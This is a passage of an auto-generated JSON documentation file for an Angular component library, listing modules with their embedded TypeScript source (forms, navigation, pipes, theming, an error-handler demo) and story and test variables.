              "name": "StoFilterPanelComponent"
            },
            {
              "name": "StoFilterTableActions"
            },
            {
              "name": "StoFilterTitle"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "StoFilterActions"
            },
            {
              "name": "StoFilterPanelComponent"
            },
            {
              "name": "StoFilterTableActions"
            },
            {
              "name": "StoFilterTitle"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoFormModule",
      "id": "module-StoFormModule-b2aa40a79ef457122213c81455285d738b8a1867a71c97ffd951f51c22ba58851839ad682fbd177a4474fd2e3abe7e1a6287168f3ae845e5849d0e06f6a29c48",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/form/src/lib/sto-form/sto-form.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { FormFieldDirective } from './form-field.directive';\nimport { MatFormFieldModule } from '@angular/material/form-field';\n\n@NgModule({\n  declarations: [ FormFieldDirective ],\n  imports: [\n    CommonModule,\n    MatFormFieldModule\n  ],\n  exports: [ FormFieldDirective ],\n  providers: [\n    // { provide: MAT_FORM_FIELD_DEFAULT_OPTIONS, useValue: { appearance: 'fill' }}\n  ]\n})\nexport class StoFormModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "FormFieldDirective"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "FormFieldDirective"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoMessagePanelModule",
      "id": "module-StoMessagePanelModule-bf9b588f2d316e2fc1905d763163d44b7ceac2f737b04478a4a5d7102af211e8b248c23f7c2977d393744ab0464baeca3c26f0c879c2791e92a67ea2a1d6520a",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/common/src/lib/sto-message-panel/sto-message-panel.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { MatIconModule } from '@angular/material/icon';\nimport { MatTooltipModule } from '@angular/material/tooltip';\nimport { StoMessagePanelComponent } from './sto-message-panel.component';\nimport { MatButtonModule } from '@angular/material/button';\n\n\n@NgModule({\n  imports: [ CommonModule, MatIconModule, MatTooltipModule, MatButtonModule ],\n  exports: [StoMessagePanelComponent],\n  declarations: [StoMessagePanelComponent]\n})\nexport class StoMessagePanelModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "StoMessagePanelComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "StoMessagePanelComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoNavigationModule",
      "id": "module-StoNavigationModule-082ebb5bc055d9a98f3f48bbf75f348d227ecce2f827c8cf2f380061452de203e4d43624f3a801851cc4d4de29c58251b37c4e052c164255ef7a7b3b7d669a32",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/drawer/src/lib/sto-navigation/sto-navigation.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { NavigationPartComponent } from './navigation-part/navigation-part.component';\nimport { NavigationMenuComponent } from './navigation-menu/navigation-menu.component';\nimport { NavigationMenuItemComponent } from './navigation-menu/navigation-menu-item/navigation-menu-item.component';\nimport { MatButtonModule } from '@angular/material/button';\nimport { MatExpansionModule } from '@angular/material/expansion';\nimport { MatIconModule } from '@angular/material/icon';\nimport { MatListModule } from '@angular/material/list';\n\n\n@NgModule({\n  imports: [\n      CommonModule\n    , MatIconModule\n    , MatButtonModule\n    , MatListModule\n    , MatExpansionModule\n  ],\n  exports: [\n      NavigationPartComponent\n    , NavigationMenuComponent\n    , NavigationMenuItemComponent\n  ],\n  declarations: [\n      NavigationPartComponent\n    , NavigationMenuComponent\n    , NavigationMenuItemComponent\n  ],\n})\nexport class StoNavigationModule {\n}\n\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "NavigationMenuComponent"
            },
            {
              "name": "NavigationMenuItemComponent"
            },
            {
              "name": "NavigationPartComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "NavigationMenuComponent"
            },
            {
              "name": "NavigationMenuItemComponent"
            },
            {
              "name": "NavigationPartComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoOptionSelectAllComponentModule",
      "id": "module-StoOptionSelectAllComponentModule-a524b696270d62d5715540bbc158f0ebdbaad14d4a08cc7809d0490b545afa71b91e837a5a05227de504e2dac0d0a2c33cb2497499173f10686756de5c6baafd",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/form/src/lib/sto-option-select-all/sto-option-select-all.component.ts",
      "methods": [],
      "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectionStrategy,\n  ChangeDetectorRef,\n  Component,\n  ElementRef,\n  Host,\n  NgModule,\n  OnDestroy,\n  Optional,\n} from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { MatPseudoCheckboxState } from '@angular/material/core';\nimport { MatSelect } from '@angular/material/select';\nimport { takeUntil } from 'rxjs/operators';\nimport { Subject } from 'rxjs';\nimport { MatCheckboxModule } from '@angular/material/checkbox';\n\n@Component({\n  selector: 'sto-option-select-all',\n  templateUrl: './sto-option-select-all.component.html',\n  styleUrls: [ './sto-option-select-all.component.scss' ],\n  changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class StoOptionSelectAllComponent<T = unknown> implements AfterViewInit, OnDestroy {\n  state: MatPseudoCheckboxState = 'checked';\n\n  private options: Array<unknown> = [];\n  private _value: Array<T> = [];\n  set value(value: Array<T>) {\n    this._value = value ?? [];\n  }\n\n  get value() {\n    return this._value;\n  }\n\n  private destroyed = new Subject();\n\n  constructor(\n    @Host() @Optional() private matSelect: MatSelect,\n    private cdr: ChangeDetectorRef,\n    private el: ElementRef<HTMLElement>) {\n  }\n\n  ngAfterViewInit() {\n    if ( !this.matSelect ) {\n      this.el.nativeElement.style.display = 'none';\n      return;\n    }\n    this.options = this.matSelect.options?.map(x => x.value) ?? [];\n    this.matSelect.options?.changes\n      .pipe(takeUntil(this.destroyed))\n      .subscribe(() => {\n        this.options = this.matSelect.options.map(x => x.value);\n        this.updateState();\n      });\n\n    if (this.matSelect.ngControl?.control) {\n      // Null-checked via isControl\n      // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n        // @ts-ignore\n      this.value = this.matSelect.ngControl.control.value;\n        this.matSelect.ngControl.valueChanges\n          ?.pipe(takeUntil(this.destroyed))\n          .subscribe(res => {\n            this.value = res;\n            this.updateState();\n          });\n    } else {\n      this.el.nativeElement.style.display = 'none';\n    }\n    // ExpressionChangedAfterItHasBeenCheckedError fix...\n    setTimeout(() => {\n      this.updateState();\n    });\n  }\n\n  ngOnDestroy() {\n    this.destroyed.next();\n    this.destroyed.complete();\n  }\n\n  onSelectAllClick() {\n    if (this.state === 'checked') {\n      this.matSelect.ngControl?.control?.setValue([]);\n    }\n    else {\n      this.matSelect.ngControl?.control?.setValue(this.options);\n    }\n\n  }\n\n  private updateState() {\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n    // @ts-ignore\n    const areAllSelected = this.areArraysEqual(this.value, this.options);\n    if (areAllSelected) {\n      this.state = 'checked';\n    }\n    else if (this.value.length > 0) {\n      this.state = 'indeterminate'\n    }\n    else {\n      this.state = 'unchecked';\n    }\n    this.cdr.markForCheck();\n  }\n\n  private areArraysEqual(a: Array<T>, b: Array<T>) {\n    if (!a || !b) {\n      return false;\n    }\n    return [...a].sort().join(',') === [...b].sort().join(',');\n  }\n}\n\n@NgModule({\n  imports: [ CommonModule, MatCheckboxModule ],\n  declarations: [StoOptionSelectAllComponent],\n  exports: [StoOptionSelectAllComponent],\n})\nexport class StoOptionSelectAllComponentModule {}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "StoOptionSelectAllComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "StoOptionSelectAllComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoPipesModule",
      "id": "module-StoPipesModule-fb86bd449dd9cc5cc7e49974300575b855278293d564e408c342b7b7427fac3c07c3356fe4fe6ff49fb12cee21249ba13f41fed56dc43897b4db2f47a9e5ea0f",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/core/src/lib/sto-pipes/sto-pipes.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { NumberFormatPipe } from './number-format.pipe';\nimport { CurrencyFormatPipe } from './currency-format.pipe';\nimport { KeysPipe } from './keys.pipe';\nimport { DateFormatPipe } from './date-format.pipe';\nimport { ExcludeUnit, GetUnit } from './with-unit';\nimport { YesNoPipe } from './yes-no';\n\n@NgModule({\n  imports: [CommonModule],\n  declarations: [\n    DateFormatPipe,\n    KeysPipe,\n    NumberFormatPipe,\n    CurrencyFormatPipe,\n    GetUnit,\n    ExcludeUnit,\n    YesNoPipe\n  ],\n  exports: [\n    DateFormatPipe,\n    KeysPipe,\n    NumberFormatPipe,\n    CurrencyFormatPipe,\n    GetUnit,\n    ExcludeUnit,\n    YesNoPipe\n  ]\n})\nexport class StoPipesModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "CurrencyFormatPipe"
            },
            {
              "name": "DateFormatPipe"
            },
            {
              "name": "ExcludeUnit"
            },
            {
              "name": "GetUnit"
            },
            {
              "name": "KeysPipe"
            },
            {
              "name": "NumberFormatPipe"
            },
            {
              "name": "YesNoPipe"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "CurrencyFormatPipe"
            },
            {
              "name": "DateFormatPipe"
            },
            {
              "name": "ExcludeUnit"
            },
            {
              "name": "GetUnit"
            },
            {
              "name": "KeysPipe"
            },
            {
              "name": "NumberFormatPipe"
            },
            {
              "name": "YesNoPipe"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoSelectFilterModule",
      "id": "module-StoSelectFilterModule-83f048208e68ecc66a72c2892b2d07734a4b1acc9ab6384639703e0a5dc8da26e9a83b20949cf0a50227b7ebbb183549611e052445818a5b4ee2a699137e0993",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/form/src/lib/sto-select-filter/sto-select-filter.module.ts",
      "methods": [],
      "sourceCode": "import { FormsModule, ReactiveFormsModule } from '@angular/forms';\nimport { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { StoSelectFilterComponent } from './sto-select-filter.component';\nimport { MatCheckboxModule } from '@angular/material/checkbox';\nimport { MatIconModule } from '@angular/material/icon';\nimport { MatInputModule } from '@angular/material/input';\n\n@NgModule({\n  imports: [\n    CommonModule,\n    MatInputModule, MatIconModule, MatCheckboxModule,\n    FormsModule, ReactiveFormsModule\n  ],\n  declarations: [StoSelectFilterComponent],\n  exports: [StoSelectFilterComponent],\n})\nexport class StoSelectFilterModule { }\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "StoSelectFilterComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "StoSelectFilterComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoThemeModule",
      "id": "module-StoThemeModule-fbfcbde992c3a56ee34873319bb71151073997bbcce26a855c01b22e0434098bbdc2bb26495a03550c4f318f4a5a54ad30ce4bf5aebdaa581afbd54000e11ffb",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/common/src/lib/theme/theme.module.ts",
      "methods": [
        {
          "name": "forRoot",
          "args": [],
          "optional": false,
          "returnType": "ModuleWithProviders<StoThemeModule>",
          "typeParameters": [],
          "line": 13,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            124
          ]
        }
      ],
      "sourceCode": "import { ModuleWithProviders, NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { StoThemeService } from './theme.service';\nimport { ThemeSaverService } from './theme-saver.service';\n\n@NgModule({\n  declarations: [],\n  imports: [\n    CommonModule\n  ]\n})\nexport class StoThemeModule {\n  static forRoot(): ModuleWithProviders<StoThemeModule> {\n    return {\n      ngModule: StoThemeModule,\n      providers: [\n        StoThemeService,\n        ThemeSaverService\n      ]\n    };\n  }\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": []
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": []
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoUserPreferenceModule",
      "id": "module-StoUserPreferenceModule-8ccb87650f9bb603c172f4ae9754dc4317218fd80ae1d71f12b70c006069bec9d5b518dab657ed8dbd5abfe4a3a68ff153f5fbc57f1d2530837f39b746d05a2c",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.module.ts",
      "methods": [
        {
          "name": "forRoot",
          "args": [],
          "optional": false,
          "returnType": "ModuleWithProviders<StoUserPreferenceModule>",
          "typeParameters": [],
          "line": 14,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            124
          ]
        }
      ],
      "sourceCode": "import { ModuleWithProviders, NgModule } from '@angular/core';\nimport { StoUserPreferenceService } from './sto-user-preference.service';\nimport { CommonModule } from '@angular/common';\nimport { StoUserPreferenceComponent } from './sto-user-preference.component';\nimport { MatExpansionModule } from '@angular/material/expansion';\nimport { FormsModule, ReactiveFormsModule } from '@angular/forms';\n\n@NgModule({\n  imports: [CommonModule, MatExpansionModule, ReactiveFormsModule, FormsModule],\n  exports: [StoUserPreferenceComponent],\n  declarations: [StoUserPreferenceComponent]\n})\nexport class StoUserPreferenceModule {\n  static forRoot(): ModuleWithProviders<StoUserPreferenceModule> {\n    return {\n      ngModule: StoUserPreferenceModule,\n      providers: [StoUserPreferenceService]\n    };\n  }\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "StoUserPreferenceComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "StoUserPreferenceComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoWysiwygModule",
      "id": "module-StoWysiwygModule-a1f4c978a2e0a3545cfb748cb43f89b7299c8e197008e87ad154b9b7415d95167106d424d51e1d7617605ef9696506031732c5a69b3bba9c5d4306f4ab48bed7",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { WysiwygComponent } from './wysiwyg.component';\nimport { MatButtonModule } from '@angular/material/button';\nimport { MatIconModule } from '@angular/material/icon';\nimport { MatMenuModule } from '@angular/material/menu';\nimport { MatButtonToggleModule } from '@angular/material/button-toggle';\nimport { WysiwygActionsComponent } from './wysiwyg-actions/wysiwyg-actions.component';\nimport { WysiwygEditorComponent } from './wysiwyg-editor/wysiwyg-editor.component';\n\n@NgModule({\n  declarations: [ WysiwygComponent, WysiwygActionsComponent, WysiwygEditorComponent ],\n  imports: [\n    CommonModule,\n    MatButtonModule,\n    MatIconModule,\n    MatMenuModule,\n    MatButtonToggleModule\n  ],\n  exports: [ WysiwygComponent ]\n})\nexport class StoWysiwygModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "WysiwygActionsComponent"
            },
            {
              "name": "WysiwygComponent"
            },
            {
              "name": "WysiwygEditorComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "WysiwygComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "WrapperModule",
      "id": "module-WrapperModule-76dbeb67c05168c1d4f6862dbe89f181cf4f845ed02296a6bf6df841971cc943095e99b6be10c7e55350d83683723899f2846b7a0f07c70f177b522e799322a1",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/error-handler/src/lib/wrapper.ts",
      "methods": [],
      "sourceCode": "import { Component, Injectable, NgModule } from '@angular/core';\nimport { HttpClient, HttpClientModule, HttpErrorResponse } from '@angular/common/http';\nimport { CommonModule } from '@angular/common';\nimport { MatButtonModule } from '@angular/material/button';\nimport {\n  CUSTOM_ERROR_HANDLER, ERROR_LOGGER,\n  ErrorHandlerService,\n  Handler,\n  HttpError,\n  StoErrorHandler\n} from '@ngx-stoui/error-handler';\n\n@Component({\n  selector: 'next-wrapper',\n  template: `\n    <button mat-button\n            (click)=\"overRide(404)\">Overridden 404\n    </button>\n    <button mat-button\n            (click)=\"showError(s)\"\n            *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\n  `,\n  providers: []\n})\nexport class NextWrapperComponent {\n  public errors = [\n    0,\n    400,\n    401,\n    403,\n    404,\n    409,\n    500,\n    501,\n    503\n  ];\n\n  constructor(private service: ErrorHandlerService) {\n  }\n\n  showError(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    this.service.handler(err);\n  }\n\n  overRide(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    const handler = function (err: HttpErrorResponse) {\n      const e = new HttpError(err);\n      e.title = 'Local override 404';\n      e.text = 'Local override not found item';\n      return e;\n    };\n    this.service.handler(err, handler);\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class ErrorHandlerImpl implements StoErrorHandler {\n  [ code: number ]: Handler;\n\n  401(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'Custom not signed in';\n    error.text = 'Custom not signed in text';\n    return error;\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class Logger {\n  constructor(private http: HttpClient) {\n  }\n\n  log(err: HttpError) {\n    // This method will typically go to the application backend or a central log repository\n    console.log('Error', err);\n  }\n}\n\nfunction LoggerFactory(http: HttpClient) {\n  return new Logger(http);\n}\n\n@NgModule({\n  declarations: [ NextWrapperComponent ],\n  imports: [ CommonModule, MatButtonModule, HttpClientModule ],\n  exports: [ NextWrapperComponent ],\n  providers: [\n    { provide: CUSTOM_ERROR_HANDLER, useClass: ErrorHandlerImpl },\n    { provide: ERROR_LOGGER, useFactory: LoggerFactory, deps: [ HttpClient ] }\n  ]\n})\nexport class WrapperModule {\n}\n\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "NextWrapperComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "NextWrapperComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    }
  ],
  "miscellaneous": {
    "variables": [
      {
        "name": "Accent",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<StoMessagePanelComponent>",
        "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"accent\" [dismissable]=\"false\" icon=\"info\">Accent Text Content</sto-message-panel>'\n  };\n}"
      },
      {
        "name": "Actionbar",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<Partial<StoDatatableComponent<Record<string, >>>>",
        "defaultValue": "args => ( {\n  props: args,\n  template: `<h3>With an actionbar on the top left and right side</h3>\n<sto-datatable [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\">\n  <sto-datatable-actions>\n      <sto-datatable-actions-left>\n        <button mat-icon-button><mat-icon>content_copy</mat-icon></button>\n        <button mat-icon-button><mat-icon>delete</mat-icon></button>\n       </sto-datatable-actions-left>\n      <sto-datatable-actions-right>\n        <button mat-icon-button><mat-icon>settings</mat-icon></button>\n      </sto-datatable-actions-right>\n  </sto-datatable-actions>\n</sto-datatable>`,\n} )"
      },
      {
        "name": "ActionFooter",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "ALL_GRIDS",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "[]",
        "defaultValue": "[ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ]"
      },
      {
        "name": "AppHeader",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "argTypes",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "object",
        "defaultValue": "{\n  color: { control: { disable: true } },\n  dismissable: { control: { disable: true } },\n  icon: { control: { disable: true } },\n  severity: { control: { disable: true } },\n}"
      },
      {
        "name": "AsTestEnvironment",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<StoAppHeaderComponent>",
        "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: {\n      ...args,\n      environmentName: 'Systemtest',\n      testEnvironment: true,\n    },\n    template: `<sto-app-header [breadCrumbs]=\"[ { label: 'Root' }, { label: 'SubModule' } ]\" [environmentName]=\"environmentName\" [testEnvironment]=\"true\"></sto-app-header>`\n  };\n}"
      },
      {
        "name": "AutoSize",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story",
        "defaultValue": "(args) => ( {\n  props: args,\n  template: `<h3>Autosize will ensure the table always uses all available height top-down</h3>\n<sto-datatable [virtualScroll]=\"true\" [autoSize]=\"true\" [autoSizeOffset]=\"autosizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\">\n</sto-datatable>`,\n} )"
      },
      {
        "name": "breadCrumbs",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/test-utils.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Breadcrumb[]",
        "defaultValue": "[\n  {\n    label: 'One',\n    command: () => {\n      console.log('Wat?');\n    }\n  }, {\n    label: 'Two',\n    command: () => {\n    },\n    segment: '2',\n  },\n]"
      },
      {
        "name": "Breadcrumbs",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "Template.bind({})"
      },
      {
        "name": "COLORS",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "[]",
        "defaultValue": "[\n  'primary', 'accent', 'warning', 'danger', 'success'\n]"
      },
      {
        "name": "columns",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/lib/rows.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "[]",
        "defaultValue": "[\n  {\n    prop: 'invoiceNo',\n    name: 'Invoice# (randsort)',\n    flexBasis: 200,\n    flexShrink: 1,\n    flexGrow: 1,\n    // random sort\n    sortFn: () => {\n      let n = Math.round(Math.random() * 1000);\n      if (n < 500) {\n        n = -n;\n      }\n      return n;\n    }\n  },\n  {\n    prop: 'voyageNo',\n    flexBasis: 200,\n    disableResize: true,\n    name: 'Voyage# (no resize)',\n    disableSort: true,\n    headerClass: 'aclass',\n    cellClass: () => {\n      return 'a-cell-class';\n    }\n  },\n  {\n    prop: 'vesselName',\n    flexBasis: 200,\n    name: 'Vessel',\n    headerClass: 'bclass',\n    flexGrow: 1\n  },\n  {\n    prop: 'allocated',\n    flexBasis: 200,\n    name: 'Allocated',\n    headerClass: 'aclass'\n  },\n  {\n    prop: 'total',\n    flexBasis: 200,\n    name: 'Total',\n    headerClass: 'aclass',\n    cellClass: 'a-cell-class'\n  }\n]"
      },
      {
        "name": "columns",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/testing/utils.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Column[]",
        "defaultValue": "[\n  { prop: 'invoiceNo', $$id: 'invoiceNo', name: 'invoiceNo', },\n  { prop: 'voyageNo', $$id: 'voyageNo', name: 'voyageNo', },\n  { prop: 'vesselName', $$id: 'vesselName', name: 'vesselName', },\n  { prop: 'allocated', $$id: 'allocated', name: 'allocated', },\n  { prop: 'total', $$id: 'total', name: 'total' },\n]"
      },
      {
        "name": "context",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/test.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
      },
      {
        "name": "context",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/core/src/test.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
      },
      {
        "name": "context",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/error-handler/src/test.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
      },
      {
        "name": "context",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/datatable/src/test.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
      },
      {
        "name": "context",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/test.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
      },
      {
        "name": "context",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/drawer/src/test.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
      },
      {
        "name": "control",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "new UntypedFormControl({ value: 32.123, unit: 'C' }, Validators.required)"
      },
      {
        "name": "CUSTOM_ERROR_HANDLER",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/error-handler/src/lib/error-handler/token.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "",
        "defaultValue": "new InjectionToken<ErrorHandler>('sto.custom-error-handler')"
      },
      {
        "name": "Danger",
        "ctype": "miscellaneous",
        "subtype": "variable",
        "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "Story<StoMessagePanelComponent>",
        "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"danger\" [dismissable]=\"false\" icon=\"error\">Danger Text Content (a little to red atm.. :) )</sto-message-panel>'\n  };\n}"
      },
      {
        "name": "dialogConfig",
        "ctype": "miscellaneous",
        "subtype": "variable",
